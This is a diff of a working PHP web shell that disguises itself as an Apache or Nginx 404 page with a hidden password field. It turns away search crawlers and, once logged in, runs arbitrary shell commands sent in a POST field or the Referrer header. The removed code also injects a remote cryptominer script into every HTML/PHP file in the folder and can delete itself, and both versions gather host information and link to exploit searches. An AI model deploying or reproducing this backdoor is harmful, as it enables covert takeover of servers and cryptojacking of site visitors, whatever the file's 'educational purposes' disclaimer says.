@@ -1,575 +1,99 @@
 <?php
-	
-	// ---- VARIABLES ----
 
-	$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma
+/**
+ * This code has been developed for educational purposes only.
+ * Any action and/or activity related to the material contained herein is your sole responsibility.
+ * Misuse may result in criminal charges being brought against the individuals concerned.
+ */
 
-	$coinimpkey = ""; // <---- Insert here your CoinImp Site Key (https://www.coinimp.com/dashboard) [str, hex, 64 char-length key]
+// =========== Configuration ===========
 
-	$robots = array(
-		'Baiduspider',
-		'Bing',
-		'DuckDuck',
-		'Google',
-		'ia_archiver',
-		'MSNBot',
-		'Rambler',
-		'Slurp',
-		'Sogou',
-		'Yandex'
-	);
+@session_start();
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 
-	// ---- TEMPLATES ----
+// =========== Passphrase ===========
 
-		// - Apache -
+$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma
 
-	/**
-	 *	Show the 404 Apache page
-	 */
-	function ApacheNotFound()
-	{
-?>
-<head>
-	<?=ApacheNotFound_Head();?>
-</head>
-<body>
-	<?=ApacheNotFound_Body();?>
-</body>
-<?php
-		exit(0);
-	}
+if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) === $passphrase))) {
+    $_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
+}
 
-	/**
-	 *	Apache stylesheet template
-	 */
-	function ApacheNotFound_Head()
-	{
-?>
-	<style>
-		div {
-			position: absolute;
-			top: 50%;
-			left: 50%;
-			margin-top: -25px;
-			margin-left: -50px;
-		}
+// =========== Headers ===========
 
-		div form input {
-			margin: 0;
-			border: 0;
-			background-color: #FFF;
-		}
-	</style>
-<?php
-	}
+header('HTTP/1.0 404 Not Found');
+header('Server: '.$_SERVER['SERVER_SOFTWARE']);
+header('X-Powered-By: Unicorns and pumas <3');
 
-	/**
-	 *	Apache HTML template
-	 */
-	function ApacheNotFound_Body()
-	{
-?>
-	<h1>Not Found</h1>
-	<p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
-	<hr>
-	<address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
+// =========== Anti-Robots ===========
 
+$robots = array('Baiduspider','Bing','DuckDuck','Google','ia_archiver','MSNBot','Rambler','Slurp','Sogou','Yandex');
+foreach($robots as $robot)
+    if(strpos($_SERVER['HTTP_USER_AGENT'], $robot) !== false)
+        exit(0);
 
-	<div>
-		<!-- Issue #2: Firefox Autocomplete -->
-		<input style="display: none;" type="password" autocomplete="foo" />
+// =========== PHP Info ===========
 
-		<form method="POST">
-			<input type="password" name="passwd" autocomplete="foo">
-		</form>
-	</div>
-<?php
-	}
+if(isset($_GET['p'])) { phpinfo(); die(); }
 
-		// - Shell -
+// =========== Shell ===========
 
-	/**
-	 *	Show the Shell
-	 */
-	function Shell()
-	{
-?>
-<head>
-	<?=ShellNavStyle();?>
-	<?=ShellContentsStyle();?>
-</head>
-<body>
-	<?=ShellContents();?>
-	<?=ShellNavbar();?>
-</body>
-<?php
-	}
+if(!empty($_SERVER['HTTP_REFERRER']) && !str_starts_with($_SERVER['HTTP_REFERRER'],'http')) {
+    passthru($_SERVER["HTTP_REFERRER"]); die();
+}
 
-	/**
-	 *	Shell navbar stylesheet template
-	 */
-	function ShellNavStyle()
-	{
-?>
-	<style>
-		* {
-		margin: 0;
-		padding: 0;
-		outline: 0;
-		box-sizing: border-box;
-		}
+// =========== Close ===========
 
-		body {
-			height: 100vh;
-			background-color: #ddd;
-		}
+if(isset($_GET['c'])) {
+    unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
+    session_destroy();
+    header("Location: " . explode("?", $_SERVER['REQUEST_URI'])[0], true, 302);
+    die();
+}
 
-		div nav {
-			position: relative;
-			background: #333;
-			width: calc(100% - 60px);
-			margin: 0 auto;
-			padding: 10px 20px 10px 20px;
-			text-align: right;
-		}
+// =========== Information ===========
 
-		div nav:before {
-			position: absolute;
-			content: '';
-			border-top: 10px solid #333;
-			border-right: 10px solid #333;
-			border-left: 10px solid transparent;
-			border-bottom: 10px solid transparent;
-			top: 100%;
-			left: 0;
-		}
+/***
+ * Get information about the target
+ */
+function get_info() {
+    $user = explode('\\',@shell_exec('whoami'));
+    $GLOBALS['_info'] = array(
+        'user'     => end($user),
+        'system'   => substr(@php_uname('s'),0,20).'/'.substr(@php_uname('r'),0,20),
+        'software' => explode(' ',$_SERVER['SERVER_SOFTWARE'])[0],
+        'php'      => 'PHP/'.phpversion(),
+    );
+    $GLOBALS['_actions'] = array(
+        'PHP Info'            => '?p',
+        'Geolocate'           => 'https://www.google.es/maps/place/'.file_get_contents('http://ip-api.com/csv/'.trim(file_get_contents("https://ipinfo.io/ip"))."?fields=lat,lon"),
+        'Exploit-DB (PHP)'    => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['php']))[0],
+        'Exploit-DB (Server)' => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['software']))[0],
+        'Exploit-DB (System)' => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['system']))[0],
+        'Log out'             => '?c',
+    );
+}
 
-		div nav:after {
-			position: absolute;
-			content: '';
-			border-top: 10px solid #333;
-			border-right: 10px solid transparent;
-			border-left: 10px solid #333;
-			border-bottom: 10px solid transparent;
-			top: 100%;
-			right: 0;
-		}
+// =========== Templates ===========
 
-		div nav div {
-			width: 20%;
-			float: left;
-			color: #fff;
-			font-size: 25px;
-			text-align: left;
-			padding-left: 2%;
-		}
+/**
+ * Apache 404 Template
+ */
+function tpl_apache() { ?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address><div><input style="display:none;" type="password" autocomplete="foo" /><form method="POST"><input style="border:0;outline:0" type="password" name="passwd" autocomplete="foo"></form></div></body></html><?php }
 
-		div nav ul {
-			margin-right: 1%;
-		}
+/**
+ * Nginx 404 Template
+ */
+function tpl_nginx() { ?><html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center><?=$_SERVER['SERVER_SOFTWARE']?></center><div><input style="display:none;" type="password" autocomplete="foo" /><form method="POST"><input style="border:0;outline:0" type="password" name="passwd" autocomplete="foo"></form></div></body></html><?php }
 
-		div nav ul li {
-			list-style: none;
-			display: inline-block;
-			color: #fff;
-			letter-spacing: 1px;
-			padding: 0 25px;
-			font-size: 14px;
-			line-height: 30px;
-			position: relative;
-			text-transform: uppercase;
-			background: tomato;
-		}
+/**
+ * Dashboard
+ */
+function tpl_dashboard() { ?><!DOCTYPE html><html><head><title>SecurityNotFound</title><link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> <meta charset="UTF-8"><style>*{padding:0;margin:0;outline:0;box-sizing:border-box;background:#333;color:#ddd;border-block:0;border-inline:0}body,html{height:100%;font-family:monospace}body{background:#ddd;display:flex;justify-content:center;align-items:center;flex-direction:column;padding:10px}header{width:100%;padding:10px 20px;position:relative;display:flex;justify-content:space-between;align-items:center;z-index:1}header::after,header::before{content:'';position:absolute;top:100%;border-width:10px;border-style:solid;border-color:#333 #333 transparent transparent}header::after{left:0}header::before{right:0;border-color:#333 transparent transparent #333}li{text-transform:lowercase;list-style:none;display:inline-block;padding:5px 10px;margin:0 5px;background:tomato;color:#333;font-weight:700;font-size:10px;border-radius:0 5px 0 5px}aside{padding:0 25px;margin-top:-5px;background:0 0}aside,main{width:100%}main{background:grey;padding:10px;display:grid;grid-template-columns:9fr 3fr}.c,.t,section{border:1px solid grey}.c{padding:0}section{padding:10px}.d{display:grid;grid-template-columns:1fr 40px}.t{background:tomato;text-align:center;font-weight:700;color:#333;margin-bottom:5px;text-transform:uppercase;padding:5px}textarea{min-height:300px;scrollbar-width:none;-ms-overflow-style:none;white-space:pre-wrap}textarea::-webkit-scrollbar{display:none}input,textarea{width:100%;width:100%;padding:5px;border:1px solid grey}input{background:#444;border-top:0}button{border:1px solid gray;background:#333;text-align:center;color:#333;display:inline-block}button:hover{background:#222;cursor:pointer}a{text-decoration:none;text-align:center;padding:5px;display:inline-block;width:100%;margin:2px;border:1px solid gray}a:hover{background:#222}</style></head><body><header><h2>Err404 :: SecurityNotFound</h2><div><?php foreach($GLOBALS['_info'] as $k=>$v) echo('<li>'.$v.'</li>') ?></div></header><aside><main><section><div class="t">🎮 Console 🎮</div><div class="c"><textarea readonly id="d"></textarea><div class="d"><form onsubmit="return f()"><input id="s" placeholder="command..."></form><button onclick="return z()">🧹</button></div></div></section><section><div class="t">🔌 Actions 🔌</div><div class="c"><?php foreach($GLOBALS['_actions'] as $k=>$v) echo('<a href="'.$v.'">'.$k.'</a>') ?></div></section></main></aside><script>var n='_logs';var t = document.getElementById('d');var u=()=>{t.innerHTML=(localStorage.getItem(n)||'').trimEnd();t.scrollTop=t.scrollHeight};var z=()=>{localStorage.removeItem(n);u();return false};var f=()=>{c=document.getElementById('s').value;fetch(location.pathname,{referrer:'',headers:new Headers({'Referrer':c})}).then(r=>r.text()).then((r)=>{var l=localStorage.getItem(n)||'';localStorage.setItem(n,l+`$ ${c}\n${r}\n\n`);u()});return false};</script></body></html><?php }
 
-		.exit {
-			padding: 0 7px;
-			background: grey;
-			
-		}
+// =========== Entrypoint ===========
 
-		.exit:hover {
-			background: orange;
-		}
-
-		a {
-			text-decoration: none;
-		}
-	</style>
-<?php
-	}
-
-	/**
-	 *	Shell contents stylesheet template
-	 */
-	function ShellContentsStyle()
-	{
-?>
-	<style>
-		.contents {
-			width: 100vw;
-			height: 100vh;
-			position: absolute;
-			top: 0; left: 0;
-			display: flex;
-			justify-content: center;
-			align-items: center;
-		}
-
-		.menu {
-			width: 90%;
-			height: 80%;
-			background-color: grey;
-			display: flex;
-			flex-wrap: wrap;
-			flex-direction: row;
-			justify-content: center;
-			align-items: center;
-			align-content: center;
-		}
-
-		.submenu {
-			margin: 20px 10px;
-			background-color: #333;
-			width: calc(50% - 30px);
-			height: calc(100% - 40px);
-			display: flex;
-			flex-wrap: wrap;
-			flex-direction: row;
-			justify-content: center;
-			align-items: center;
-			align-content: center;
-		}
-		
-		.full-element
-		{
-			width:97%;
-		}
-
-		/* BEGIN - CONSOLE */
-
-		.title {
-			color: #333;
-			height: 30px;
-			font-weight: bold;
-			text-align: center;
-			vertical-align: middle;
-			line-height: 30px;
-			font-size: 18px;
-			background: tomato;
-			letter-spacing: 0px;
-			text-transform: uppercase;
-			margin-bottom: 5px;
-			border: 1px solid grey;
-		}
-
-		.console-output {
-			height: calc(100% - 90px);
-			resize: none;
-			background-color: #333;
-			color: white;
-			border: 1px solid grey;
-			padding: 10px;
-			scrollbar-width: none;		// Firefox
-			-ms-overflow-style: none;	// IE 10+
-
-			::-webkit-scrollbar {
-				display: none;
-			}
-		}
-
-		.console-input {
-			width: 100%;
-			height: 30px;
-			background-color: #333;
-			color: white;
-			padding: 0 10px;
-			border: 1px solid grey;
-			border-top: 0;
-		}
-
-		/* END - CONSOLE */
-
-		.button {
-			width: 30%;
-			color: #333;
-			height: 30px;
-			font-weight: bold;
-			text-align: center;
-			vertical-align: middle;
-			line-height: 30px;
-			font-size: 14px;
-			background-color: grey;
-			text-transform: uppercase;
-			margin: 5px;
-			border: 1px solid #333;
-		}
-
-		.button:hover {
-			background: tomato;
-		}
-
-		.selfremove:hover {
-			color: white;
-			background-color: brown;
-		}
-	</style>
-<?php
-	}
-
-	/**
-	 *	Shell navbar HTML template
-	 */
-	function ShellNavbar()
-	{
-?>
-<div style="padding-top: 25px;">
-<nav>
-		<div>SecurityNotFound</div>
-		<ul>
-			<li><?=$GLOBALS['INFO']['USER']?></li>
-			<li><?=$GLOBALS['INFO']['KERNEL']?></li>
-			<li><?=$GLOBALS['INFO']['RELEASE']?></li>
-			<a href="?exit"><li class="exit">⛔</li></a>
-		</ul>
-	</nav>
-</div>
-<?php
-	}
-
-	/**
-	 *	Shell contents HTML template
-	 */
-	function ShellContents()
-	{
-?>
-<div class="contents">
-	<div class="menu">
-		<div class="submenu">
-			<div class="title full-element">🎮   CONSOLE   🎮</div>
-			<textarea readonly id="console" class="console-output full-element">
-<?php
-		foreach($_SESSION['OUTPUTS'] as $output)
-		{
-			echo $output . PHP_EOL;
-		}
-?>
-			</textarea>
-			<form class="full-element" method="POST">
-				<input type="text" name="cmd" class="console-input">
-			</form>
-		</div>
-		<div class="submenu">
-			<a class="button" href="?info">PHPINFO</a>
-			<a class="button" rel="noopener noreferrer" target="_blank" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
-			<a class="button" rel="noopener noreferrer" target="_blank" href="<?=GeoLocate();?>">GEOLOCATE</a>
-			<a class="button" href="?cryptominer">CRYPTOMINER</a>
-			<a class="button selfremove" href="?selfremove">SELF-REMOVE</a>
-		</div>
-	</div>
-</div>
-
-<script>
-	var textarea = document.getElementById('console');
-	textarea.scrollTop = textarea.scrollHeight;
-</script>
-<?php
-	}
-
-	// ---- FUNCTIONS ----
-
-	/**
-	 *	Set the 404 most common headers
-	 *	Easter Egg: X-Powered-By
-	 */
-	function SetHeaders()
-	{
-		header('HTTP/1.0 404 Not Found');
-		header('X-Powered-By: Unicorns and kitties <3');
-	}
-
-	/**
-	 *	Avoid the most common robots / crawlers
-	 */
-	function FightRobots()
-	{
-		global $robots;
-		foreach($robots as $robot)
-		{
-			if(strpos($_SERVER['HTTP_USER_AGENT'], $robot) !== false)
-			{
-				exit(0);
-			}
-		}
-	}
-
-	/**
-	 *	Harvest information about the compromised machine
-	 */
-	function GatherInformation()
-	{
-		// Issue #3: Current user vs File owner
-		$user = explode('\\',@shell_exec('whoami'));
-		$info = array(
-			'USER'	  => end($user),
-			'KERNEL'  => substr(@php_uname('s'), 0, 20),
-			'RELEASE' => substr(@php_uname('r'), 0, 20)
-		);
-		$GLOBALS['INFO'] = $info;
-	}
-
-	/**
-	 *	Reload the current page without parameters
-	 */
-	function ReloadPage()
-	{
-		header("Location: " . explode("?", $_SERVER[REQUEST_URI])[0], true, 302);
-	}
-
-	/**
-	 *	Check if the specified passwd (POST) is set nor matchs the current passphrase
-	 * 		True => New session
-	 * 		False => Apache 404 Page
-	 */
-	function CheckPasswd()
-	{
-		global $passphrase;
-		if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase)))
-		{
-			$_SESSION['OUTPUTS'] = array();
-			$_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
-			ReloadPage();
-		}
-		else
-		{
-			ApacheNotFound();
-		}
-	}
-
-	/**
-	 *	Destroy the current session
-	 */
-	function ClearSession()
-	{
-		unset($_SESSION['OUTPUTS']);
-		unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
-		session_destroy();
-		ReloadPage();
-	}
-
-	function CryptoMiner()
-	{
-		global $coinimpkey;
-		$signature = '<!-- :> -->';
-		$miner = $signature . '<script src="https://www.hostingcloud.racing/kwgR.js"></script><script>var _a=new Client.Anonymous("' . $coinimpkey . '",{throttle:0});_a.start();</script>';
-		
-		$files = scandir(dirname(__FILE__));
-		foreach($files as $file)
-		{
-			$ext = substr($file,-5,5);
-			$isvalid = (strcmp($ext, '.html') == 0 || strcmp(substr($ext,-4,4), '.php') == 0);
-			if($isvalid && strcmp($file, basename(__FILE__)) != 0)
-			{
-				$content = file_get_contents($file);
-				if(strpos($content,$signature) === false)
-				{
-					$content = str_replace('</body>', $miner . '</body>', $content);
-					file_put_contents($file, $content);
-				}
-			}
-		}
-		ReloadPage();
-	}
-
-	function RunCommand()
-	{
-		$format_cmd = strtolower(trim($_POST['cmd']));
-		if((strcmp($format_cmd,"cls") == 0) || (strcmp($format_cmd,"clear") == 0))
-		{
-			$_SESSION['OUTPUTS'] = array();
-		}
-		else
-		{
-			$output = "$ " . $_POST['cmd'] . PHP_EOL . shell_exec($_POST['cmd'] . ' 2>&1');
-			array_push($_SESSION['OUTPUTS'], $output);
-		}
-	}
-
-	function SelfRemove()
-	{
-		// FIXME: [Linux] Warning: Permission denied (Already in use)
-		unlink(__FILE__);
-		ClearSession();
-	}
-
-	function ExploitDB()
-	{
-		$kernel = explode(" ", $GLOBALS['INFO']['KERNEL'])[0];
-		$release = explode(".", $GLOBALS['INFO']['RELEASE'])[0];
-		$exploitdb = "https://www.exploit-db.com/search?q=";
-		return AnonymousRequest($exploitdb . $kernel . "+" . $release);
-	}
-
-	function GeoLocate()
-	{
-		$ip = file_get_contents("https://ipinfo.io/ip");
-		$coords = file_get_contents("http://ip-api.com/csv/" . trim($ip) . "?fields=lat,lon");
-		$maps = "https://www.google.es/maps/place/";
-		return AnonymousRequest($maps . $coords);
-	}
-
-	function AnonymousRequest($URI)
-	{
-		$proxy = "http://nullrefer.com/?";
-		return $proxy . $URI;
-	}
-
-	// ---- ENTRYPOINT ----
-
-	function Main()
-	{
-		
-
-		session_start();
-	
-		SetHeaders();
-		FightRobots();
-
-		if(isset($_GET['exit']))
-		{
-			ClearSession();
-		}
-		else if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]))
-		{
-			if(isset($_POST['cmd']))
-			{
-				RunCommand();
-			}
-
-			if(isset($_GET['info']))
-			{
-				phpinfo();
-			}
-			else if(isset($_GET['selfremove']))
-			{
-				SelfRemove();
-			}
-			else if(isset($_GET['cryptominer']))
-			{
-				CryptoMiner();
-			}
-			else
-			{		
-				GatherInformation();
-				Shell();
-			}
-		}
-		else
-		{
-			CheckPasswd();
-		}
-	}
-	Main();
-
-	// https://github.com/mIcHyAmRaNe/wso-webshell
-	// https://coolors.co/dddddd-aaaaaa-808080-333333-ff6347
-?>
+if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]) && $_SESSION[md5($_SERVER['REMOTE_ADDR'])]) { get_info(); tpl_dashboard(); }
+else if(!substr_compare('n',$_SERVER['SERVER_SOFTWARE'],0,1)) tpl_nginx();
+else tpl_apache();
